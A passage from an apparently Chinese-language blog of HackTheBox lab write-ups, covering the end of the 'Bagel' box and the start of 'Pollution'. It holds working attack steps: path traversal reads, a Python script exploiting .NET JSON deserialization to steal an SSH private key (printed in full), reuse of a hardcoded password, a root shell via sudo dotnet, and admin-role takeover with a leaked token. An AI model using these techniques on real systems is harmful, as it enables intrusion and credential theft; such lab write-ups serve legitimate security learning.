class="line">		<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">InitializeServer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			<span class="comment">//IL_0010: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line">			<span class="comment">//IL_001a: Expected O, but got Unknown</span></span><br><span class="line">			_Server = <span class="keyword">new</span> WatsonWsServer(_ServerIp, _ServerPort, _Ssl);</span><br><span class="line">			_Server.set_AcceptInvalidCertificates(<span class="literal">true</span>);</span><br><span class="line">			_Server.add_MessageReceived((EventHandler&lt;MessageReceivedEventArgs&gt;)MessageReceived);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">StartServer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			<span class="keyword">await</span> _Server.StartAsync(<span class="literal">default</span>(CancellationToken));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">MessageReceived</span>(<span class="params"><span class="built_in">object</span> sender, MessageReceivedEventArgs args</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			<span class="built_in">string</span> json = <span class="string">&quot;&quot;</span>;</span><br><span class="line">			<span class="keyword">if</span> (args.get_Data() != <span class="literal">null</span> &amp;&amp; args.get_Data().Count &gt; <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				json = Encoding.UTF8.GetString(args.get_Data().Array, <span class="number">0</span>, args.get_Data().Count);</span><br><span class="line">			&#125;</span><br><span class="line">			Handler handler = <span class="keyword">new</span> Handler();</span><br><span class="line">			<span class="built_in">object</span> obj = handler.Deserialize(json);</span><br><span class="line">			<span class="built_in">object</span> obj2 = handler.Serialize(obj);</span><br><span class="line">			_Server.SendAsync(args.get_IpPort(), obj2.ToString(), <span class="literal">default</span>(CancellationToken));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Base</span> : <span class="title">Orders</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="built_in">int</span> userid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="built_in">string</span> session = <span class="string">&quot;Unauthorized&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">int</span> UserId</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">get</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> userid;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">set</span></span><br><span class="line">			&#123;</span><br><span class="line">				userid = <span class="keyword">value</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">string</span> Session</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">get</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> session;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">set</span></span><br><span class="line">			&#123;</span><br><span class="line">				session = <span class="keyword">value</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">string</span> Time =&gt; DateTime.Now.ToString(<span class="string">&quot;h:mm:ss&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Orders</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="built_in">string</span> order_filename;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="built_in">string</span> order_info;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> File file = <span class="keyword">new</span> File();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">object</span> RemoveOrder &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">string</span> WriteOrder</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">get</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> file.WriteFile;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">set</span></span><br><span class="line">			&#123;</span><br><span class="line">				order_info = <span class="keyword">value</span>;</span><br><span class="line">				file.WriteFile = order_info;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">string</span> ReadOrder</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">get</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> file.ReadFile;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">set</span></span><br><span class="line">			&#123;</span><br><span class="line">				order_filename = <span class="keyword">value</span>;</span><br><span class="line">				order_filename = order_filename.Replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">				order_filename = order_filename.Replace(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">				file.ReadFile = order_filename;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title">File</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="built_in">string</span> file_content;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="built_in">string</span> IsSuccess = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="built_in">string</span> directory = <span class="string">&quot;/opt/bagel/orders/&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="built_in">string</span> filename = <span class="string">&quot;orders.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">string</span> ReadFile</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">get</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> file_content;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">set</span></span><br><span class="line">			&#123;</span><br><span class="line">				filename = <span class="keyword">value</span>;</span><br><span class="line">				ReadContent(directory + filename);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">string</span> WriteFile</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">get</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> IsSuccess;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">set</span></span><br><span class="line">			&#123;</span><br><span class="line">				WriteContent(directory + filename, <span class="keyword">value</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ReadContent</span>(<span class="params"><span class="built_in">string</span> path</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				IEnumerable&lt;<span class="built_in">string</span>&gt; values = System.IO.File.ReadLines(path, Encoding.UTF8);</span><br><span class="line">				file_content += <span class="built_in">string</span>.Join(<span class="string">&quot;\n&quot;</span>, values);</span><br><span class="line">			&#125;</span><br><span class="line">			catch (Exception)</span><br><span class="line">			&#123;</span><br><span class="line">				file_content = <span class="string">&quot;Order not found!&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">WriteContent</span>(<span class="params"><span class="built_in">string</span> filename, <span class="built_in">string</span> line</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				System.IO.File.WriteAllText(filename, line);</span><br><span class="line">				IsSuccess = <span class="string">&quot;Operation successed&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			catch (Exception)</span><br><span class="line">			&#123;</span><br><span class="line">				IsSuccess = <span class="string">&quot;Operation failed&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DB</span></span><br><span class="line">	&#123;</span><br><span class="line">		[<span class="meta">Obsolete(<span class="meta-string">&quot;The production team has to decide where the database server will be hosted. This method is not fully implemented.&quot;</span>)</span>]</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DB_connection</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			<span class="comment">//IL_0008: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line">			<span class="comment">//IL_000e: Expected O, but got Unknown</span></span><br><span class="line">			<span class="built_in">string</span> text = <span class="string">&quot;Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K&quot;</span>;</span><br><span class="line">			SqlConnection val = <span class="keyword">new</span> SqlConnection(text);</span><br><span class="line">			<span class="built_in">string</span> text2 = <span class="string">&quot;INSERT INTO orders (Name,Address,Count,Type) VALUES (&#x27;Eliot&#x27;,&#x27;Street&#x27;,4,&#x27;Baggel&#x27;)&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可能有用的凭证<code>developer:k8wdAYYKyhnjg3K</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">developer@10.10.11.201: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).</span><br></pre></td></tr></table></figure>
<p>看来不是用来SSH口令登录的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../proc/self/status | cat</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Name:	python3</span><br><span class="line">Umask:	0022</span><br><span class="line">State:	S (sleeping)</span><br><span class="line">Tgid:	893</span><br><span class="line">Ngid:	0</span><br><span class="line">Pid:	893</span><br><span class="line">PPid:	1</span><br><span class="line">TracerPid:	0</span><br><span class="line">Uid:	1000	1000	1000	1000</span><br><span class="line">Gid:	1000	1000	1000	1000</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../proc/891/status | cat</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Name:	dotnet</span><br><span class="line">Umask:	0022</span><br><span class="line">State:	S (sleeping)</span><br><span class="line">Tgid:	891</span><br><span class="line">Ngid:	0</span><br><span class="line">Pid:	891</span><br><span class="line">PPid:	1</span><br><span class="line">TracerPid:	0</span><br><span class="line">Uid:	1001	1001	1001	1001</span><br><span class="line">Gid:	1001	1001	1001	1001</span><br></pre></td></tr></table></figure>
<p>8000端口的WEB服务所有者为用户developer，5000端口的WS服务所有者为用户phil</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/15294585.html">https://www.cnblogs.com/nice0e3/p/15294585.html</a><br />
<a target="_blank" rel="noopener" href="https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15">https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15</a></p>
</blockquote>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JsonSerializerSettings val = <span class="keyword">new</span> JsonSerializerSettings();</span><br><span class="line">val.set_TypeNameHandling((TypeNameHandling)<span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<p>反序列化设置<code>TypeNameHandling</code>为，即auto，所以我们可以利用对象<code>RemoveOrder</code>利用反序列化在处理<code>typeName</code>时的漏洞</p>
<p>编写<code>ws.py</code>如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ws.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">ws = websocket.WebSocket()    </span><br><span class="line">ws.connect(<span class="string">&quot;ws://10.10.11.201:5000/&quot;</span>) <span class="comment"># connect to order app</span></span><br><span class="line">order = &#123;<span class="string">&quot;RemoveOrder&quot;</span>: &#123;<span class="string">&quot;$type&quot;</span>: <span class="string">&quot;bagel_server.File, bagel&quot;</span>, <span class="string">&quot;ReadFile&quot;</span>:<span class="string">&quot;../../..%s&quot;</span> % sys.argv[<span class="number">1</span>]&#125;&#125;</span><br><span class="line">data = <span class="built_in">str</span>(json.dumps(order))</span><br><span class="line">ws.send(data)</span><br><span class="line">result = ws.recv()</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p><code>$type</code>的值为程序集限定名，即调用<code>bagel</code>(程序集名称，貌似可以粗略理解为dll的文件名)中命名空间<code>bagel_server</code>的<code>File</code>类<br />
然后调用函数<code>ReadFile</code>并进行赋值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ws.py /home/phil/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<p>得到SSH私钥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----&quot;</span> &gt; /tmp/phil.id_rsa</span><br><span class="line">chmod 400 /tmp/phil.id_rsa</span><br><span class="line">ssh -i /tmp/phil.id_rsa phil@10.10.11.201</span><br></pre></td></tr></table></figure>
<p>登入SSH服务，查看user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/phil/user.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e3c34107a7c750f4897e23fe74a9ee2e</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-29"><a class="markdownIt-Anchor" href="#权限提升-29"></a> 权限提升</h2>
<p>切至developer用户，并查看sudo权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su developer</span><br><span class="line">k8wdAYYKyhnjg3K</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for developer on bagel:</span><br><span class="line">    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep&#x3D;&quot;COLORS DISPLAY</span><br><span class="line">    HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+&#x3D;&quot;MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;,</span><br><span class="line">    env_keep+&#x3D;&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+&#x3D;&quot;LC_MONETARY LC_NAME LC_NUMERIC</span><br><span class="line">    LC_PAPER LC_TELEPHONE&quot;, env_keep+&#x3D;&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;var&#x2F;lib&#x2F;snapd&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User developer may run the following commands on bagel:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;dotnet</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/dotnet fsi</span><br><span class="line">System.Diagnostics.Process.Start(<span class="string">&quot;/bin/bash&quot;</span>).WaitForExit();;</span><br></pre></td></tr></table></figure>
<p>获得root权限，查看root.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d5a0583d89d813c3e82758bd9aba410d</span><br></pre></td></tr></table></figure>
<hr />
<p>.NET json反序列化还是有点超出我的知识范围了</p>
<hr />
<p>n1</p>
<h1 id="hackthebox_pollution"><a class="markdownIt-Anchor" href="#hackthebox_pollution"></a> HackTheBox_Pollution</h1>
<h2 id="信息收集-14"><a class="markdownIt-Anchor" href="#信息收集-14"></a> 信息收集</h2>
<h3 id="端口扫描-31"><a class="markdownIt-Anchor" href="#端口扫描-31"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-10000 -sV -T5 -v 10.10.11.192</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for collect.htb (10.10.11.192)</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 9997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp   open  http    Apache httpd 2.4.54 ((Debian))</span><br><span class="line">6379&#x2F;tcp open  redis   Redis key-value store</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h3 id="vhost-4"><a class="markdownIt-Anchor" href="#vhost-4"></a> VHOST</h3>
<p>访问<code>http://10.10.11.192</code></p>
<p>页面中得到域名<code>collect.htb</code></p>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.192\tcollect.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>子域名枚举</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class="string">&quot;collect.htb&quot;</span> -H <span class="string">&quot;Host: FUZZ.collect.htb&quot;</span> --hl 541</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000000023:   200        336 L    1220 W     14099 Ch    &quot;forum&quot;</span><br><span class="line">000002341:   401        14 L     54 W       469 Ch      &quot;developers&quot;</span><br></pre></td></tr></table></figure>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.192\tforum.collect.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.192\tdevelopers.collect.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-29"><a class="markdownIt-Anchor" href="#漏洞利用-29"></a> 漏洞利用</h2>
<p>从链接<code>http://forum.collect.htb/attachment.php?aid=3</code>得到HTTP访问记录</p>
<p>得到以下纪录</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/set/role/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>collect.htb</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=r8qne20hig1k3li6prgk91t33j</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"></span><br><span class="line">token=ddac62a28254561001277727cb397baf</span><br></pre></td></tr></table></figure>
<p>在<code>collect.htb</code>注册并登入</p>
<p>使用该Token对自己在<code>collect.htb</code>对应得Session进行赋予admin角色操作</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://collect.htb/<span class="built_in">set</span>/role/admin -H <span class="string">&quot;Cookie: PHPSESSID=Bufferfly;&quot;</span> -d <span class="string">&quot;token=ddac62a28254561001277727cb397baf&quot;</span> -v</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">*   Trying 10.10.11.192:80...</span><br><span class="line">* Connected to collect.htb (10.10.11.192) port 80 (#0)</span><br><span class="line">&gt; POST &#x2F;set&#x2F;role&#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">&gt; Host: collect.htb</span><br><span 